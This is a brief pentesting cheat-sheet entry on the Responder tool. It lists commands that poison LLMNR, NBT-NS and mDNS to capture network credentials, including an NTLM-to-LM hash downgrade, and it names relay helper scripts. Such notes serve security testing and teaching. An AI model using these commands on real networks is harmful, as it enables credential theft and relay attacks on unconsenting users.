Responder is a sniffing tool used **to gain vulnerable credentials from network traffic, including those sent over SMB, HTTP, and other protocols**. Responder is also an LLMNR, NBT-NS, and MDNS poisoner.
```bash
$ nano /usr/share/responder/Responder.conf # Configure Responder
```

```bash
$ responder -I <Iface> #Default conf
$ responder -I <Iface> --lm #Default conf, attempt to downgrade NTLM hashes to LM hashes
$ responder -I <Iface> -P -r -v #More chances but might break things
```

# Additional tools 
/usr/share/responder/tools
Additional scripts 
* `Runfinger.py` check if `SMB signing` hash been disabled on attacked station. (Required for attack to work)
* `MultiRelay.py`
# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks
https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks


